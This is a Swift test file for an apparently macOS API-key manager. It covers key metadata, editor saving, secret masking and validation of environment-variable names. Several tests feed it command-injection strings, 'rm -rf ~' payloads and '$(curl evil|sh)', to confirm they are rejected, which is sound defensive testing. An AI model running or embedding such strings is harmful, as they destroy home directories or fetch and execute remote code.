import Foundation
import Testing
@testable import AIkeychain

@Suite("ServiceType Tests")
struct ServiceTypeTests {

    @Test("All services have display names")
    func displayNames() {
        for service in ServiceType.allCases {
            #expect(!service.displayName.isEmpty)
        }
    }

    @Test("All services have env var names")
    func envVarNames() {
        for service in ServiceType.allCases {
            #expect(!service.envVarName.isEmpty)
            #expect(service.envVarName == service.envVarName.uppercased()
                    .replacingOccurrences(of: " ", with: "_"))
        }
    }

    @Test("All services have categories")
    func categories() {
        for service in ServiceType.allCases {
            // Just accessing category shouldn't crash
            _ = service.category
        }
    }

    @Test("All services have system images")
    func systemImages() {
        for service in ServiceType.allCases {
            #expect(!service.systemImage.isEmpty)
        }
    }

    @Test("Token prefix format is correct")
    func tokenPrefixes() {
        #expect(ServiceType.anthropic.tokenPrefix == "sk-ant-")
        #expect(ServiceType.github.tokenPrefix == "ghp_")
        #expect(ServiceType.gitlab.tokenPrefix == "glpat-")
        #expect(ServiceType.discord.tokenPrefix == nil)
    }

    @Test("Setup URLs are valid")
    func setupURLs() {
        for service in ServiceType.allCases {
            if let url = service.setupURL {
                #expect(url.scheme == "https")
            }
        }
    }
}

@Suite("KeyCategory Tests")
struct KeyCategoryTests {

    @Test("All categories have unique colors")
    func uniqueColors() {
        let categories = KeyCategory.allCases
        // Just verify no crashes accessing color
        for cat in categories {
            _ = cat.color
            _ = cat.systemImage
        }
    }

    @Test("Category count is 7")
    func categoryCount() {
        // 6 プリセットカテゴリ + CLI 発見用 .cliAdded（#153）
        #expect(KeyCategory.allCases.count == 7)
    }
}

@Suite("KeyEditorViewModel Tests")
struct KeyEditorViewModelTests {

    @Test("New editor starts with no selection")
    func defaultService() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        #expect(vm.selectedService == nil)
        #expect(vm.envVarName == "")
        #expect(vm.selectedCategorySelection == nil)
    }

    @Test("Icon follows the category default until the user picks one")
    func iconFollowsCategory() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedCategorySelection = .builtin(.cloud)
        vm.categoryDidChange()
        #expect(vm.selectedIcon == KeyCategory.cloud.systemImage)

        // Switching category updates the icon (not manually set yet)
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.categoryDidChange()
        #expect(vm.selectedIcon == KeyCategory.devTools.systemImage)
    }

    @Test("Once the user picks an icon, category changes no longer override it")
    func pickedIconSticks() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedCategorySelection = .builtin(.cloud)
        vm.categoryDidChange()
        vm.pickIcon("flame")
        #expect(vm.selectedIcon == "flame")
        vm.selectedCategorySelection = .builtin(.ai)
        vm.categoryDidChange()
        #expect(vm.selectedIcon == "flame") // sticks
    }

    @Test("Over-limit values are rejected with a length message before touching the keychain (#191)")
    func valueTooLongMessage() {
        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock)
        vm.envVarName = "TEST_EDITOR_LONG"
        let max = SecurityCLIKeychainService.maxValueLength(forAccount: "TEST_EDITOR_LONG")
        vm.tokenValue = String(repeating: "a", count: max + 1)
        #expect(throws: KeychainError.self) { try vm.save() }
        // 汎用の "Failed to encode/decode" ではなく、上限値を含む案内が出る
        #expect(vm.errorMessage?.contains("\(max)") == true)
        #expect(vm.isSaving == false)
        #expect(mock.exists(for: "TEST_EDITOR_LONG") == false)
    }

    @Test("Prefix warning shows for wrong prefix")
    func prefixWarning() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedService = .anthropic
        vm.tokenValue = "wrong-prefix-token"
        #expect(vm.prefixWarning != nil)
    }

    @Test("No prefix warning for correct prefix")
    func noPrefixWarning() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedService = .anthropic
        vm.tokenValue = "sk-ant-correct"
        #expect(vm.prefixWarning == nil)
    }

    @Test("No prefix warning when service not selected")
    func noPrefixWarningNoService() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.tokenValue = "any-value"
        #expect(vm.prefixWarning == nil)
    }

    @Test("Can save WITHOUT a service when category + env var + value are set (issue #102)")
    func canSaveNoService() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedService = nil // Service is an optional preset, not required
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.envVarName = "MY_CUSTOM_KEY"
        vm.tokenValue = "test"
        #expect(vm.canSave == true)
    }

    @Test("Cannot save with an invalid env var name even with a category")
    func cannotSaveInvalidEnvVar() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.envVarName = "bad name!" // not a valid shell identifier
        vm.tokenValue = "test"
        #expect(vm.canSave == false)
    }

    @Test("Cannot save without category selection")
    func cannotSaveNoCategory() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedService = .anthropic
        vm.envVarName = "ANTHROPIC_API_KEY"
        vm.tokenValue = "test"
        vm.selectedCategorySelection = nil
        #expect(vm.canSave == false)
    }

    @Test("Cannot save with empty token")
    func cannotSaveEmpty() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedService = .anthropic
        vm.selectedCategorySelection = .builtin(.ai)
        vm.envVarName = "ANTHROPIC_API_KEY"
        vm.tokenValue = ""
        #expect(vm.canSave == false)
    }

    @Test("Can save with valid selection and token")
    func canSaveValid() {
        let vm = KeyEditorViewModel(keychainService: MockKeychainService())
        vm.selectedService = .anthropic
        vm.selectedCategorySelection = .builtin(.ai)
        vm.envVarName = "ANTHROPIC_API_KEY"
        vm.tokenValue = "sk-ant-test123"
        #expect(vm.canSave == true)
    }

    @Test("Save stores value in keychain")
    func saveStoresValue() throws {
        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock)
        vm.selectedService = .anthropic
        vm.selectedCategorySelection = .builtin(.ai)
        vm.tokenValue = "test-token"
        vm.envVarName = "ANTHROPIC_API_KEY"
        try vm.save()
        #expect(mock.store["ANTHROPIC_API_KEY"] == "test-token")
    }

    @Test("Editing key loads existing value")
    func editLoadExisting() throws {
        let mock = MockKeychainService()
        try mock.save(value: "existing-value", for: "GITHUB_TOKEN")
        let key = APIKey(service: .github, isConfigured: true)
        let vm = KeyEditorViewModel(editingKey: key, keychainService: mock)
        #expect(vm.tokenValue == "existing-value")
        #expect(vm.isEditing == true)
    }

    /// Build a CustomKeyStore backed by an isolated UserDefaults suite so tests
    /// never touch the real app state.
    private func isolatedStore() -> (CustomKeyStore, UserDefaults, String) {
        let suite = "test-keyeditor-\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suite)!
        return (CustomKeyStore(defaults: defaults), defaults, suite)
    }

    @Test("Save with NO service + custom env var creates a CustomKey with the chosen category (#102)")
    func saveNoServiceCreatesCustomKey() throws {
        let (store, defaults, suite) = isolatedStore()
        defer { defaults.removePersistentDomain(forName: suite) }

        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock, customStore: store)
        vm.selectedService = nil
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.envVarName = "MY_CUSTOM_KEY"
        vm.tokenValue = "secret-1"
        try vm.save()

        #expect(mock.store["MY_CUSTOM_KEY"] == "secret-1")
        let created = store.keys.first { $0.envVarName == "MY_CUSTOM_KEY" }
        #expect(created != nil)
        #expect(created?.categoryId == KeyCategory.devTools.stableId)
        #expect(created?.displayName == "MY_CUSTOM_KEY")
    }

    @Test("Save stores a user-picked icon on a custom key (#110)")
    func saveCustomKeyWithIcon() throws {
        let (store, defaults, suite) = isolatedStore()
        defer { defaults.removePersistentDomain(forName: suite) }

        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock, customStore: store)
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.envVarName = "MY_CUSTOM_KEY"
        vm.tokenValue = "x"
        vm.pickIcon("flame")
        try vm.save()

        let created = store.keys.first { $0.envVarName == "MY_CUSTOM_KEY" }
        #expect(created?.icon == "flame")
    }

    @Test("Custom key icon equal to category default is not persisted (follows category)")
    func saveCustomKeyIconMatchingCategoryNotStored() throws {
        let (store, defaults, suite) = isolatedStore()
        defer { defaults.removePersistentDomain(forName: suite) }

        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock, customStore: store)
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.categoryDidChange() // icon = devTools default
        vm.envVarName = "MY_CUSTOM_KEY"
        vm.tokenValue = "x"
        try vm.save()

        let created = store.keys.first { $0.envVarName == "MY_CUSTOM_KEY" }
        #expect(created?.icon == nil) // nil → follows category icon
    }

    @Test("Save stores an icon override for a preset-named key (#110)")
    func saveIconOverrideForPresetName() throws {
        let (store, defaults, suite) = isolatedStore()
        defer { defaults.removePersistentDomain(forName: suite) }

        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock, customStore: store)
        vm.selectedCategorySelection = .builtin(.codeAndGit)
        vm.envVarName = "GITHUB_TOKEN"
        vm.tokenValue = "ghp_x"
        vm.pickIcon("star.fill")
        try vm.save()

        #expect(store.overriddenIcon(for: "GITHUB_TOKEN") == "star.fill")
    }

    @Test("APIKey.systemImage prefers a custom key's explicit icon (#110)")
    func apiKeyExplicitIcon() {
        let key = APIKey(customKey: CustomKey(
            envVarName: "X_CUSTOM", displayName: "X",
            categoryId: KeyCategory.devTools.stableId, icon: "flame"))
        #expect(key.systemImage == "flame")
    }

    @Test("Old CustomKey JSON without an icon field decodes safely (migration, #110)")
    func oldCustomKeyJsonDecodes() throws {
        // A record persisted by a version before the `icon` field existed.
        let json = """
        [{"id":"\(UUID().uuidString)","envVarName":"LEGACY_KEY","displayName":"Legacy",
          "categoryId":"\(KeyCategory.ai.stableId.uuidString)"}]
        """
        let decoded = try JSONDecoder().decode([CustomKey].self, from: Data(json.utf8))
        #expect(decoded.count == 1)
        #expect(decoded[0].envVarName == "LEGACY_KEY")
        #expect(decoded[0].icon == nil) // missing field → nil, no crash
    }

    @Test("Save with NO service but a preset-named env var preserves the chosen category via override (#102)")
    func saveNoServicePresetNamePreservesCategory() throws {
        let (store, defaults, suite) = isolatedStore()
        defer { defaults.removePersistentDomain(forName: suite) }

        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock, customStore: store)
        vm.selectedService = nil
        // GITHUB_TOKEN is a preset (default category Code & Git) but the user
        // deliberately files it under Developer Tools without picking a service.
        vm.selectedCategorySelection = .builtin(.devTools)
        vm.envVarName = "GITHUB_TOKEN"
        vm.tokenValue = "ghp_test"
        try vm.save()

        #expect(mock.store["GITHUB_TOKEN"] == "ghp_test")
        // The chosen category must be persisted as an override, not silently lost.
        #expect(store.overriddenCategory(for: "GITHUB_TOKEN") == .builtin(.devTools))
        // It is a preset, so no CustomKey is created.
        #expect(store.keys.contains { $0.envVarName == "GITHUB_TOKEN" } == false)
    }

    @Test("Save with NO service + preset env var + matching default category writes no override")
    func saveNoServicePresetDefaultCategoryNoOverride() throws {
        let (store, defaults, suite) = isolatedStore()
        defer { defaults.removePersistentDomain(forName: suite) }

        let mock = MockKeychainService()
        let vm = KeyEditorViewModel(keychainService: mock, customStore: store)
        vm.selectedService = nil
        vm.selectedCategorySelection = .builtin(.codeAndGit) // GitHub's default
        vm.envVarName = "GITHUB_TOKEN"
        vm.tokenValue = "ghp_test"
        try vm.save()

        #expect(store.overriddenCategory(for: "GITHUB_TOKEN") == nil)
    }
}

@Suite("SecretMask Tests")
struct SecretMaskTests {

    @Test("Short values are fully masked with no original characters and a fixed width (hides length)")
    func shortValueFullyMasked() {
        let short = "abcdefghi" // 9 chars, below the reveal threshold
        let masked = SecretMask.mask(short)
        #expect(!masked.contains("a"))
        #expect(masked.allSatisfy { $0 == "*" })
        #expect(masked.count != short.count) // fixed width, doesn't leak the real length

        // A different short value of a different length must mask to the SAME width.
        let otherShort = "ab"
        #expect(SecretMask.mask(otherShort).count == masked.count)
    }

    @Test("Long values reveal only a short prefix and never the suffix")
    func longValueRevealsPrefixOnly() {
        let long = "sk-ant-1234567890ABCDEF" // >= 16 chars
        let masked = SecretMask.mask(long)
        #expect(masked.hasPrefix("sk-a"))
        #expect(!masked.contains("ABCDEF"))
        #expect(!masked.hasSuffix("EF"))
    }

    @Test("Boundary: value exactly at threshold-1 is fully masked, at threshold reveals prefix")
    func boundaryBehavior() {
        let justBelow = String(repeating: "x", count: 15)
        let atThreshold = String(repeating: "y", count: 16)
        #expect(SecretMask.mask(justBelow).allSatisfy { $0 == "*" })
        #expect(SecretMask.mask(atThreshold).hasPrefix("yyyy"))
    }
}

@Suite("EnvVarName Tests")
struct EnvVarNameTests {

    @Test("Valid env var names are accepted")
    func acceptsValidNames() {
        #expect(EnvVarName.isValid("OPENAI_API_KEY"))
        #expect(EnvVarName.isValid("_x"))
        #expect(EnvVarName.isValid("A"))
        #expect(EnvVarName.isValid("_1_2_3"))
    }

    @Test("Invalid env var names are rejected")
    func rejectsInvalidNames() {
        #expect(!EnvVarName.isValid("EVIL\"; rm -rf ~; #"))
        #expect(!EnvVarName.isValid("has space"))
        #expect(!EnvVarName.isValid("1leading"))
        #expect(!EnvVarName.isValid(""))
    }

    @Test("Names with embedded newlines are rejected (anchors match whole string, not line)")
    func rejectsMultilineNames() {
        // ^/$ が行アンカーとして働くと "A\nB" の "A" 行がマッチしてしまう。
        // 文字列全体アンカーであることを担保する回帰テスト。
        #expect(!EnvVarName.isValid("A\nB"))
        #expect(!EnvVarName.isValid("SAFE\nEVIL; rm -rf ~"))
        #expect(!EnvVarName.isValid("SAFE\n"))
    }

    @Test("isValid does not trim: surrounding whitespace makes a name invalid")
    func doesNotTrim() {
        // isValid(x) が true なら「x そのもの」が安全、という不変条件を担保。
        #expect(!EnvVarName.isValid(" MY_KEY "))
        #expect(!EnvVarName.isValid("MY_KEY "))
        #expect(EnvVarName.isValid("MY_KEY"))
    }
}

@Suite("Keychain sink validation Tests (#116)")
struct KeychainServiceSinkValidationTests {

    @Test("save rejects an invalid account name before touching the Keychain")
    func saveRejectsInvalidAccount() {
        // ガードは subprocess 起動前に throw するため、実 Keychain に触れずに検証できる。
        // 外部由来（共有ファイル等）の不正な名前がどの ingress からでも書き込まれないこと。
        // security バイナリを存在しないパスに差し替え、万一ガードを素通りしたら
        // failedToLaunch 系で確実に落ちる（実 keychain 汚染ゼロ）ようにする。
        let service = SecurityCLIKeychainService()
        service.securityBinOverrideForTesting = "/nonexistent/security-test-stub"
        service.keychainLockedProbeForTesting = { false }
        // invalidAccount をケース一致で検証する: 型だけだと、ガードが消えて
        // subprocess 起動失敗 (unexpectedStatus) に落ちても緑になってしまい、
        // このテストが守るはずの回帰を検出できない（#183 レビュー SF-6）。
        func expectInvalidAccount(_ name: String) {
            do { try service.save(value: "x", for: name); Issue.record("expected invalidAccount for \(name)") }
            catch KeychainError.invalidAccount {}
            catch { Issue.record("expected invalidAccount for \(name), got \(error)") }
        }
        expectInvalidAccount("EVIL\"; rm -rf ~; #")
        expectInvalidAccount("has space")
        expectInvalidAccount("X=x $(curl evil|sh)")
    }
}

@Suite("EnvParser key validation Tests (#116)")
struct EnvParserKeyValidationTests {

    @Test("A line with an invalid key name is skipped during parsing")
    func invalidKeyIsSkipped() {
        let text = "EVIL\"; rm -rf ~; #=malicious"
        let entries = EnvParser.parse(text)
        #expect(entries.isEmpty)
    }

    @Test("A line with a valid key name parses normally")
    func validKeyParses() {
        let text = "MY_CUSTOM_TOKEN=abc123"
        let entries = EnvParser.parse(text)
        #expect(entries.count == 1)
        #expect(entries[0].key == "MY_CUSTOM_TOKEN")
        #expect(entries[0].value == "abc123")
    }

    @Test("A mixed block only imports the entry with a valid key name")
    func mixedBlockFiltersInvalidKeys() {
        let text = """
        export MY_CUSTOM_TOKEN=abc123
        has space=shouldbeskipped
        """
        let entries = EnvParser.parse(text)
        #expect(entries.count == 1)
        #expect(entries[0].key == "MY_CUSTOM_TOKEN")
    }
}
